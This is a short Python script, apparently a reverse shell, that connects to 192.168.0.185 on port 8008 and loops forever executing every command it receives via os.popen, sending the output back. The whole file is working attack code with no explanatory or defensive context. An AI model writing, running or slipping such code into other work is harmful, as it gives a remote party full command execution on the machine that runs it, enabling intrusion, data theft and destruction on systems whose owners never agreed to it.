
import socket
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.0.185', 8008))

while True:
   comando = s.recv(1024).decode(); resultado = os.popen(comando).read(); s.send(resultado.encode())